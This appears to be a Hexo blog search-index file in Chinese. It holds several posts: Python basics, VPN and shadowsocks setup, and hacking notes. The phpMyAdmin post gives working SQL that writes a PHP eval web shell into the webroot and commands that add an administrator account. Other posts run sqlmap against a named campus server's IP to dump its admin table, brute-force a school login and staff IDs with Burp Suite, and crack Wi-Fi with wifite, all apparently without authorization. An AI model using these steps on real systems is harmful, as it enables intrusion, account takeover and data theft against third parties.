支持重载运算符，也支持泛型设计 Python 拥有一个强大的标准库，Python 语言的核心只包含 数字、字符串、列表、字典、文件 等常见类型和函数，而由 Python 标准库提供了 系统管理、网络通信、文本处理、数据库接口、图形系统、XML 处理 等额外的功能 Python 社区提供了大量的第三方模块，使用方式与标准库类似。它们的功能覆盖 科学计算、人工智能、机器学习、Web 开发、数据库接口、图形系统 多个领域 面向对象的思维方式 面向对象 是一种 思维方式，也是一门 程序设计技术 要解决一个问题前，首先考虑 由谁 来做，怎么做事情是 谁 的职责，最后把事情做好就行！ 对象 就是 谁 要解决复杂的问题，就可以找多个不同的对象，各司其职，共同实现，最终完成需求 04. Python 的优缺点4.1 优点 简单、易学 免费、开源 面向对象 丰富的库 可扩展性 如果需要一段关键代码运行得更快或者希望某些算法不公开，可以把这部分程序用 C 或 C++ 编写，然后在 Python 程序中使用它们 …… 4.2 缺点 运行速度 国内市场较小 中文资料匮乏]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[xback]]></title>
+    <url>%2F2019%2F01%2F17%2Fxback%2F</url>
+    <content type="text"><![CDATA[一炁动荡，虚无开合，雌雄感召，黑白交凝，有无互射，混混沌沌，冲虚至圣，包元含灵，神明变化，恍惚立报，是为太易，是为有始之始。始也，是谓道生一也，是曰元始。 夫天地之太极也，一炁斯析，真宰自判，交映罗列，万灵肃护，阴阳判分，是为太极，是谓一生二也，是曰虚皇。 阴阳既判，天地位焉，人乃育焉，是谓二生三也，是曰混元。 每到一个新的阶段 走走停停 初心是否还在？]]></content>
+      <categories>
+        <category>xback</category>
+      </categories>
+      <tags>
+        <tag>xback</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Weak passwords]]></title>
+    <url>%2F2016%2F09%2F08%2F20160908%2F</url>
+    <content type="text"><![CDATA[序章 弱口令问题一直存在于我们的日常生活中，诸如默认密码，用户往往安全意识薄弱而忽略了其危害性，今天我们就来谈谈弱口令的探测 Target website 经过前期大量的测试，我们寻找一个弱口令特征较为明显的web站点作为目标 BurpSuite初探 Burp是一个基于java平台的软件，用于执行对web应用程序的安全测试，包含多种工具，诸如proxy server，web spider，scanner，intruder… 篡改request请求 配置浏览器代理，输入任意用户名密码，很显然用户名密码错误 不过Burp已经抓取了发向服务器的request请求 更改request请求包数据，设置payload参数以及攻击方式 设置payload数据字典，可以设置成暴力破解也可设置成自己生成的字典 Attack进行攻击，最后根据response返回字节长度的不同即可判断正确的用户名和密码，结果截图略 终章 由于账户的权限较为大，涉及其他安全及个人隐私，包括之前也写过类似的，这里就大致简写过程。]]></content>
+      <tags>
+        <tag>weak_passwords</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[New Begin]]></title>
+    <url>%2F2016%2F06%2F06%2F20160606%2F</url>
+    <content type="text"><![CDATA[每一次新的开始，你都会以什么样的心态去面对？]]></content>
+      <tags>
+        <tag>newbegin</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[在windows上配置shadowsocks服务器]]></title>
+    <url>%2F2016%2F04%2F05%2F20160405%2F</url>
+    <content type="text"><![CDATA[安装Python官网注意：根据系统选择32或64位 需要把C:\Python27\;C:\Python27\Scripts\添加到环境变量中 安装OpenSSL官网注意：根据系统选择32或64位，不要安装Light版 经测试64位操作系统必须安装64位Python和64位OpenSSL才能正常运行 安装Shadowsockscmd管理员命令进入到C:\Python27\Scripts目录pip install shadowsocks 配置Shadowsocks在C:\Python27\Scripts下新建一个config.json12345678910&#123; &quot;server&quot;:&quot;server_ip&quot;, //服务器 IP &quot;server_port&quot;:8080, //服务器端口 &quot;local_address&quot;: &quot;127.0.0.1&quot;, //本地 IP(可不改) &quot;local_port&quot;:1080, //本地端口(可不改) &quot;password&quot;:&quot;password&quot;, //密码 &quot;timeout&quot;:300, //超时设置(默认) &quot;method&quot;:&quot;aes-256-cfb&quot;, //加密方式 &quot;fast_open&quot;: false&#125; 运行cmd管理员命令ssserver.exe -c C:\Python27\Scripts\config.json]]></content>
+      <tags>
+        <tag>shadowsocks</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[利用phpMyAdmin提权]]></title>
+    <url>%2F2016%2F03%2F31%2F20160331%2F</url>
+    <content type="text"><![CDATA[爆路径 /phpmyadmin/libraries/lect_lang.lib.php /phpMyAdmin/index.php?lang[]=1 /phpMyAdmin/phpinfo.php /load_file() /phpmyadmin/themes/darkblue_orange/layout.inc.php /phpmyadmin/libraries/select_lang.lib.php /phpmyadmin/libraries/lect_lang.lib.php /phpmyadmin/libraries/mcrypt.lib.php 得到物理路径 C:\wamp\www\phpmyadmin\themes\darkblue_orange\layout.inc.php 写马1234Create TABLE a (cmd text NOT NULL);Insert INTO a (cmd) VALUES(&quot;&lt;?php eval($_POST[Cknife]);?&gt;&quot;);select cmd from a into outfile &quot;C:/wamp/www/phpmyadmin/d.php&quot;;Drop TABLE IF EXISTS a; 获得webshell最后用Cknife连接，创建帐户并添加到管理员用户组net user admin admin /addnet localgroup administrator admin /add]]></content>
+      <tags>
+        <tag>phpMyAdmin</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[在Linux上配置VPN]]></title>
+    <url>%2F2016%2F03%2F27%2F20160327%2F</url>
+    <content type="text"><![CDATA[安装PPTPapt-get install pptpd -y 配置 IP配置vi /etc/pptpd.conf 在最后加入IP地址localip 10.0.0.1remoteip 10.0.0.100-200 DNS配置vi /etc/ppp/pptpd-options 加上DNSms-dns 8.8.8.8ms-dns 8.8.4.4 账号配置vi /etc/ppp/chap-secrets 添加账号密码username pptpd password * 转发vi /etc/sysctl.config 去掉net.ipv4.ip_forward=1的注释net.ipv4.ip_forward=1sysctl -p 使规则立即生效iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 自动伪装IPiptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j SNAT --to 外网IP NAT转发iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356 修改转发包的mss 结束]]></content>
+      <tags>
+        <tag>VPN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[使用sqlmap注入access数据库]]></title>
+    <url>%2F2016%2F02%2F18%2F20160218%2F</url>
+    <content type="text"><![CDATA[安装官网前提是需要python环境 开始注入 注入urlhttp://210.28.96.107/article_con.asp?id=30一个校内网站点 asp+access 检查注入点python sqlmap.py -u &quot;url&quot; 列出所有表名python sqlmap.py -u &quot;url&quot; --tables 列出指定表中的字段python sqlmap.py -u &quot;url&quot; -T admin --columns 爆库python sqlmap.py -u &quot;url&quot; -T admin --dump 结束其实此校内站点注入点不止这一处，但仅用于学习，切不可对站点进行修改sqlmap的用法远不止这些，具体参考官方说明文档]]></content>
+      <tags>
+        <tag>sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[使用wifite破解路由器密码]]></title>
+    <url>%2F2016%2F02%2F07%2F20160206%2F</url>
+    <content type="text"><![CDATA[简介wifite是一款自动化wep、wpa破解工具，不支持windows和osx。wifite的特点是可以同时攻击多个采用wep和wpa加密的网络。wifite只需简单的配置即可自动化运行，期间无需人工干预。对于开启wps的分分钟。。。 直接开始kali系统自带软件，双系统也好，虚拟机外接网卡也罢 终端命令 wifite 然后就会噼里啪啦出现好多五颜六色的，开始进行热点扫描 当看到clients存在时证明有人在连接 按Ctrl+c停止 输入要破解的无线网，你也可以输入 all 就会破解所有的无线网 然后睡一觉。。。醒来就会有惊喜，时间为3—4个小时]]></content>
+      <tags>
+        <tag>wifite</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[使用Burpsuite爆破弱口令教工号]]></title>
+    <url>%2F2015%2F11%2F18%2F20151118%2F</url>
+    <content type="text"><![CDATA[准备所谓工欲善其事，必先利其器，首先当然是要下载一个Burpsuite，你可以baidu，google找一个破解版的，当然也可以用kali系统自带的，不过kali系统自带的会有线程限制，只允许单线程，所以还是去找个破解版的吧！需要特别注意的是Burpsuite是用java编写的，所以学要java运行环境，正如sqlmap需要python运行环境一样。 流程 网站登录界面学校网络认证界面自动跳转10.255.200.1,从登录界面可以看出，不需要填写验证码，没有登录ip限制，说明可以无限制爆破，没错！ 浏览器配置用浏览器插件也好在Internet选项中设置也好，设置代理 ip：127.0.0.1 端口：8080 Burpsuite配置windows下的就双击BurpLoader.jar，默认监听端口为8080，也可自行更改需要注意的是我们这里需要大量爆破，所以需要把请求和响应的拦截都关闭Proxy-&gt;OptionsIntercept Client Requests和Intercept Server Requests的勾选都取消 抓第一个包基本的配置完成后，我们就就要开始抓一个包在登录界面内输入任意数字，如账号密码都为2011100000 开始爆破在Burpsuite中查看抓取的包，在下面的request请求包中右键选取Send to Intruder修改要爆破的参数,注意模式改为Battering ram设置你的payload,也可以说是字典，经过大量教工号的对比，基本教工号的格式为年份 + (/100/200/300) + (000~999) 比如2011 + 100 + 000当然排除其他的英文字母的社团学生会机房等等的账号 筛选结果对爆破的结果进行’Length’字段排序，可以看到有些返回的字节长度不一样 结束对筛选后的结果进行验证，注意！在网址为10.255.200.1的登录页面中验证]]></content>
+      <tags>
+        <tag>Burpsuite</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[用github搭建个人博客感想]]></title>
+    <url>%2F2015%2F11%2F17%2F20151116%2F</url>
+    <content type="text"><![CDATA[Github上可以用来搭建博客的工具大概有三个：Hexo, Jekyll, octopress等。本次采用Github + Hexo的方式。基本教程网上很多，这里就不具体介绍，如果遇到什么问题就把显示的错误内容等等使用baidu、google搜索查找原因。整体感觉对于markdown语法不熟悉的人编写博客有一定困难，接下来的时间里会把网上所学的一些都会写在博客里。]]></content>
+      <tags>
+        <tag>blog</tag>
+        <tag>github</tag>
+      </tags>
+  </entry>
+</search>
